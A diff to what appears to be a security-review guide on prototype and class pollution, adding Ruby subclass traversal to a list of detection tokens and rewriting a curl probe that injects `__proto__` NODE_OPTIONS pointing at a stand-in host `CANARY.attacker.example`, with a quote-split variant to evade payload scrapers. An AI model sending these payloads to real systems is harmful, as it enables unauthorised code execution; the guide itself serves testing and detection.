@@ -874,7 +874,7 @@ Classify findings under CWE-78 / 79 / 94 / 400 / 471 / 915 — match your findin
 
 **Sanitizers**: `Object.create(null)` target; own-property guard on destination; blocklist for `__proto__`/`constructor`/`prototype`; plain-object guard; `Object.freeze(Object.prototype)` (partial).
 
-JavaScript has no monopoly here: **Python and Ruby have an analogous *class pollution* class** — a recursive merge / mass-assignment over attacker keys that walks object *attributes* reaches shared class- or global-level state instead of a prototype. **Ruby**: a deep-merge / attribute-setter loop that follows `obj.class`, `.superclass`, `instance_variable_set`, or a `send("#{k}=")` chain can write **class variables / class-instance state that persist across requests** (poison a class attribute once → every later request sees it), or reach base-class/`Object` attributes for process-global effect. **Python**: a recursive `setattr`/dict-merge that follows `__class__`, `__base__`/`__bases__`, `__mro__`, `__globals__`, or `__init__.__globals__` writes to a class or module global (polluting another instance's class defaults, or a framework/subprocess global). **SAST signal**: a recursive/deep merge or `setattr`/`instance_variable_set` loop over **attacker-supplied keys** with no allowlist and no block on class/parent/global traversal keys — flag the traversal tokens `class`, `superclass`, `__class__`, `__base__`, `__bases__`, `__mro__`, `__globals__`, `__init__`, `constructor`, `prototype`. Fix: allowlist assignable attributes; never let a merge key select the target's class/parent/global. (Go/Java/Rust lack both the JS prototype chain and this dynamic-attribute-walk, so are not modeled.) PHP `parse_str`/`extract` array pollution is a separate class.
+JavaScript has no monopoly here: **Python and Ruby have an analogous *class pollution* class** — a recursive merge / mass-assignment over attacker keys that walks object *attributes* reaches shared class- or global-level state instead of a prototype. **Ruby**: a deep-merge / attribute-setter loop that follows `obj.class`, `.superclass`, **`.subclasses`** (`Class#subclasses` walks *down* to sibling/child classes, not just up — so an attacker can poison an **unrelated** class's shared secret, e.g. brute-forcing subclasses until a `KeySigner`-style `@@signing_key` mutates), `instance_variable_set`, `singleton_class`/dynamic `attr_accessor`, or a `send("#{k}=")` chain can write **class variables / class-instance state that persist across requests** (poison a class attribute once → every later request sees it), or reach base-class/`Object` attributes for process-global effect. **Python**: a recursive `setattr`/dict-merge that follows `__class__`, `__base__`/`__bases__`, `__mro__`, `__globals__`, or `__init__.__globals__` writes to a class or module global (polluting another instance's class defaults, or a framework/subprocess global). **SAST signal**: a recursive/deep merge or `setattr`/`instance_variable_set` loop over **attacker-supplied keys** with no allowlist and no block on class/parent/global traversal keys — flag the traversal tokens `class`, `superclass`, `subclasses`, `__class__`, `__base__`, `__bases__`, `__mro__`, `__globals__`, `__init__`, `constructor`, `prototype`. Fix: allowlist assignable attributes; never let a merge key select the target's class/parent/global. (Go/Java/Rust lack both the JS prototype chain and this dynamic-attribute-walk, so are not modeled.) PHP `parse_str`/`extract` array pollution is a separate class.
 
 ---
 
@@ -904,13 +904,13 @@ curl -X PUT 'https://TARGET/api/config' \
 # argv0/shell pin the child to node; --inspect triggers a DNS lookup to your OAST host
 curl -X POST 'https://TARGET/api/merge' \
   -H 'Content-Type: application/json' \
-  -d '{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=ID.oastify.com"}}'
+  -d '{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=CANARY.attacker.example"}}'
 
 # Windows: quote-split the host to evade naive payload scrapers, still resolves at runtime
-#   "NODE_OPTIONS":"--inspect=ID\"\".oastify\"\".com"
+#   "NODE_OPTIONS":"--inspect=CANARY\"\".attacker\"\".example"
 ```
 
-A DNS callback to `ID.oastify.com` confirms `Object.prototype.NODE_OPTIONS` reached a spawned node — escalate to a full gadget only on staging/isolated targets.
+A DNS callback to `CANARY.attacker.example` confirms `Object.prototype.NODE_OPTIONS` reached a spawned node — escalate to a full gadget only on staging/isolated targets.
 
 **Gadget-to-RCE probes** — staging/isolated targets only; do not run on shared production:
 
